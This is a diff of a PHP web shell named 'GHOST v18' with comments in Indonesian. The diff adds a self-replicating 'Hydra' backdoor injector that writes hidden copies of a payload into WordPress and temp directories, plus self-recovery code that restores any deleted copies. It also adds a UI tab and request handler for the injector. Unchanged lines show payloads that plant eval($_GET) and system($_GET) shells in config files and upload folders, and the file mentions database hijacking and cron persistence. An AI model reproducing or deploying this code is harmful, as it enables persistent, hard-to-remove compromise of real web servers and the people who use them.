@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V17: Grouped Scanner UI, DB CLI Bypass.
+// GHOST v18 - V18: Hydra Injector (Self-Replicate & Self-Recovery), Grouped Scanner.
 
-define('GH_VER',      '18.0.0-v17');
+define('GH_VER',      '18.0.0-v18');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,7 +338,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V16) =============================
+// ==== SECTION 4: THE ABSOLUTE DB HIJACKER (V18) =============================
 function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
@@ -1080,7 +1080,62 @@ function gh_cron_action($action, $file, $line, $content) {
     return "Aksi tidak dikenal.";
 }
 
-// ==== SECTION 8: PORT SCAN & CVE ============================================
+// ==== SECTION 8: BACKDOOR INJECTOR (Self-Replicate & Self-Recovery) ==========
+function gh_backdoor_inject($name, $content, $base_dir) {
+    if (empty($name) || empty($content)) return "Nama atau konten kosong.";
+    
+    // 1. Tulis Payload Utama
+    $main_file = rtrim($base_dir, '/') . '/' . $name;
+    if (!gh_write($main_file, $content)) return "Gagal menulis file utama ke $main_file.";
+    
+    // 2. Self-Replicating Logic
+    $replicas = array();
+    $replicate_dirs = array(
+        rtrim($base_dir, '/') . '/wp-content/uploads',
+        rtrim($base_dir, '/') . '/wp-content/themes',
+        rtrim($base_dir, '/') . '/wp-content/plugins',
+        rtrim($base_dir, '/') . '/images',
+        rtrim($base_dir, '/') . '/assets',
+        rtrim($base_dir, '/') . '/tmp',
+        '/tmp',
+        '/var/tmp'
+    );
+    
+    foreach ($replicate_dirs as $dir) {
+        if (!@is_dir($dir)) continue;
+        $copy_name = '.' . md5(uniqid()) . '.php'; // Nama random (hidden)
+        $copy_path = rtrim($dir, '/') . '/' . $copy_name;
+        if (gh_write($copy_path, $content)) {
+            $replicas[] = $copy_path;
+        }
+    }
+    
+    // 3. Inject Self-Recovery Code ke file utama (sebelum closing tag)
+    // Kita modifikasi konten yang akan ditulis jadi file utama biar dia bisa ngecek replikanya
+    $recovery_code = "\n// --- SELF-RECOVERY SCRIPT ---\n";
+    $recovery_code .= "if (function_exists('file_put_contents') && !defined('GH_RECOVER')) {\n";
+    $recovery_code .= "  define('GH_RECOVER', true);\n";
+    $recovery_code .= "  \$source = __FILE__;\n";
+    $recovery_code .= "  \$content = file_get_contents(\$source);\n";
+    $recovery_code .= "  if (\$content) {\n";
+    foreach ($replicas as $rep) {
+        $recovery_code .= "    if (!file_exists('" . addslashes($rep) . "')) { @file_put_contents('" . addslashes($rep) . "', \$content); }\n";
+    }
+    $recovery_code .= "  }\n";
+    $recovery_code .= "}\n";
+    $recovery_code .= "// ----------------------------\n";
+    
+    // Ganti closing tag atau tambahin di akhir
+    $final_content = str_replace('?>', $recovery_code . '?>', $content);
+    if (strpos($final_content, $recovery_code) === false) $final_content .= $recovery_code;
+    
+    // Timpa file utama dengan versi yang udah ada recovery logic-nya
+    gh_write($main_file, $final_content);
+    
+    return "Backdoor berhasil di-inject ke $main_file dengan " . count($replicas) . " replikasi.";
+}
+
+// ==== SECTION 9: PORT SCAN & CVE ============================================
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     $bash_script = '';
@@ -1114,7 +1169,7 @@ function gh_cve_profile() {
     return $profile;
 }
 
-// ==== SECTION 9: VULNERABILITY SCAN (PURE PHP) ==============================
+// ==== SECTION 10: VULNERABILITY SCAN (PURE PHP) =============================
 function gh_vuln_scan() {
     $vulns = array(); 
     $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
@@ -1187,6 +1242,7 @@ function gh_router() {
             case 'wp_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $u = isset($_POST['user']) ? (string)$_POST['user'] : ''; $p = isset($_POST['pass']) ? (string)$_POST['pass'] : ''; $e = isset($_POST['email']) ? (string)$_POST['email'] : ''; gh_json(array('msg' => gh_wp_action($ac, $u, $p, $e))); break;
             case 'cron_scan': gh_json(gh_cron_scan()); break;
             case 'cron_action': $ac = isset($_POST['action']) ? (string)$_POST['action'] : ''; $f = isset($_POST['file']) ? (string)$_POST['file'] : ''; $l = isset($_POST['line']) ? (string)$_POST['line'] : ''; $c = isset($_POST['content']) ? (string)$_POST['content'] : ''; gh_json(array('msg' => gh_cron_action($ac, $f, $l, $c))); break;
+            case 'inject_backdoor': $n = isset($_POST['name']) ? (string)$_POST['name'] : ''; $c = isset($_POST['content']) ? (string)$_POST['content'] : ''; $d = isset($_POST['base_dir']) ? (string)$_POST['base_dir'] : @getcwd(); gh_json(array('msg' => gh_backdoor_inject($n, $c, $d))); break;
             case 'exploit': $t = isset($_POST['type']) ? (string)$_POST['type'] : ''; $p = isset($_POST['path']) ? (string)$_POST['path'] : ''; 
                 if($t === 'WRITEABLE_CONFIG') { $pay = "\n// INJECTED\nif(isset(\$_GET['gh_x'])) { eval(\$_GET['gh_x']); }\n"; if(gh_write($p, $pay, true)) gh_json(array('msg'=>'Backdoor ditanam di '.$p.' (Akses ?gh_x=)')); else gh_json(array('msg'=>'Gagal.')); }
                 elseif($t === 'UPLOADS_EXEC') { $shell = "<?php if(isset(\$_GET['c'])) { system(\$_GET['c']); } ?>"; $f = rtrim($p,'/').'/ghost_'.rand(100,999).'.php'; if(gh_write($f, $shell)) gh_json(array('msg'=>'Shell di-upload ke: '.$f)); else gh_json(array('msg'=>'Gagal upload.')); }
@@ -1200,7 +1256,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - V17) =============================================
+// ==== UI (TAB NAVIGATION - V18) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -1218,7 +1274,7 @@ function gh_ui() {
     h2 { font-size:14px; margin:0 0 8px; color:#fff; text-transform:uppercase; letter-spacing:1px; border-bottom:1px solid var(--border); padding-bottom:4px; }
     .box { border:1px solid var(--border); padding:12px; margin-bottom:12px; background:#0d0d0d; }
     .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
-    input, button, select { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
+    input, button, select, textarea { background:#000; color:var(--fg); border:1px solid var(--border); padding:6px 8px; font-family:inherit; font-size:13px; border-radius:2px; }
     button { cursor:pointer; font-weight:bold; }
     button:hover { background:var(--fg); color:#000; }
     pre { background:#000; padding:10px; border:1px solid var(--border); margin:0; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:300px; font-size:12px; }
@@ -1244,6 +1300,7 @@ function gh_ui() {
     .tab-btn.active { background:#111; border-color:var(--border); border-bottom-color:var(--bg); color:var(--fg); border-radius:4px 4px 0 0; }
     .tab-content { display:none; }
     .tab-content.active { display:block; }
+    textarea { width:100%; height:150px; resize:vertical; }
 </style>
 </head>
 <body>
@@ -1263,6 +1320,7 @@ function gh_ui() {
     <button class="tab-btn" id="btn-tab-db-ssh" onclick="switchTab('tab-db-ssh', this)">DB & SSH</button>
     <button class="tab-btn" id="btn-tab-wp" onclick="switchTab('tab-wp', this)">WP Manager</button>
     <button class="tab-btn" id="btn-tab-cron" onclick="switchTab('tab-cron', this)">Persistence (CRON)</button>
+    <button class="tab-btn" id="btn-tab-backdoor" onclick="switchTab('tab-backdoor', this)">Backdoor Injector</button>
     <button class="tab-btn" id="btn-tab-profile" onclick="switchTab('tab-profile', this)">Profile & Port</button>
 </div>
 
@@ -1356,6 +1414,23 @@ function gh_ui() {
             <button onclick="cronAct('inject')" style="border-color:#0f0;color:#0f0;">Inject Cron</button>
         </div>
         <pre id="cron-log" style="margin-top:8px;">Ready.</pre>
+    </div>
+</div>
+
+<!-- TAB: BACKDOOR INJECTOR -->
+<div id="tab-backdoor" class="tab-content">
+    <div class="box">
+        <h2>Hydra Backdoor Injector (Self-Replicating)</h2>
+        <div class="row">
+            <input type="text" id="bd-name" placeholder="shell.php" style="flex:1;">
+            <input type="text" id="bd-dir" value="<?= htmlspecialchars(@getcwd()) ?>" placeholder="/var/www/html" style="flex:1;">
+            <button onclick="injectBd()" style="border-color:#f00;color:#f00;">Inject Backdoor</button>
+        </div>
+        <textarea id="bd-content" placeholder="Isi script backdoor lo di sini (contoh: <?php system($_GET['c']); ?>)"></textarea>
+        <div class="row" style="margin-top:8px;">
+            <input type="file" id="bd-file" onchange="loadBdFile(this)" style="color:#888;">
+        </div>
+        <pre id="bd-log" style="margin-top:8px;">Ready.</pre>
     </div>
 </div>
 
@@ -1646,6 +1721,30 @@ async function cronAct(action, encFile, encLine) {
         o.innerText = d.msg || d.err;
         document.getElementById('cron-content').value = '';
         cronScan();
+    }
+}
+
+async function injectBd() {
+    const name = document.getElementById('bd-name').value.trim();
+    const dir = document.getElementById('bd-dir').value.trim();
+    const content = document.getElementById('bd-content').value.trim();
+    const o = document.getElementById('bd-log');
+    
+    if (!name || !content) return alert('Nama dan konten harus diisi!');
+    
+    o.innerText = 'Injecting Backdoor...';
+    const d = await api('inject_backdoor', {name: name, content: content, base_dir: dir});
+    if (d.err) return o.innerText = 'Error: ' + d.err;
+    o.innerText = d.msg || 'Success.';
+}
+
+function loadBdFile(input) {
+    if (input.files && input.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            document.getElementById('bd-content').value = e.target.result;
+        };
+        reader.readAsText(input.files[0]);
     }
 }
 
